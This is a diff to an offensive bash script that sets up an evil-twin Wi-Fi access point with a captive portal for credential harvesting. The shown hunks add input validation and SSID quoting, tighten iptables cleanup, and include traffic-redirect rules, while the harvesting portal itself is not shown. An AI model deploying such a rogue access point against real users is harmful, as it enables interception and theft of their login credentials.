@@ -1,4 +1,5 @@
 #!/bin/bash
+set -euo pipefail
 # /usr/local/bin/wifi-evil-twin
 # Rogue access point with captive portal for credential harvesting
 # Creates a fake WiFi network, intercepts DNS, and serves a login page
@@ -24,7 +25,16 @@ if [ "$(id -u)" -ne 0 ]; then
     exit 1
 fi
 
-mkdir -p "$LOOT"
+if [ -z "$ESSID" ]; then
+    echo "[!] ESSID cannot be empty"
+    exit 1
+fi
+
+# Validate ESSID: no newlines or control characters (prevents hostapd config injection)
+if ! echo "$ESSID" | grep -qP '^[\x20-\x7e]+$'; then
+    echo "[!] ESSID contains invalid characters (newlines/special chars not allowed)"
+    exit 1
+fi
 
 echo "[*] ZERO-DAY OS — Evil Twin Access Point + Captive Portal"
 echo "[*] AP Interface: $AP_IFACE"
@@ -300,7 +310,7 @@ DNSMASQ_CONF=$(mktemp)
 cat > "$HOSTAPD_CONF" << EOF
 interface=$AP_IFACE
 driver=nl80211
-ssid=$ESSID
+ssid="$ESSID"
 hw_mode=g
 channel=6
 macaddr_acl=0
@@ -377,7 +387,8 @@ cleanup() {
     iptables -t nat -D POSTROUTING -o "$INET_IFACE" -j MASQUERADE 2>/dev/null
     iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null
     iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 80 2>/dev/null
-    iptables -F FORWARD 2>/dev/null
+    iptables -D FORWARD -i "$AP_IFACE" -o "$INET_IFACE" -j ACCEPT 2>/dev/null
+    iptables -D FORWARD -i "$INET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
     echo 0 > /proc/sys/net/ipv4/ip_forward
     ip addr flush dev "$AP_IFACE"
     rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"
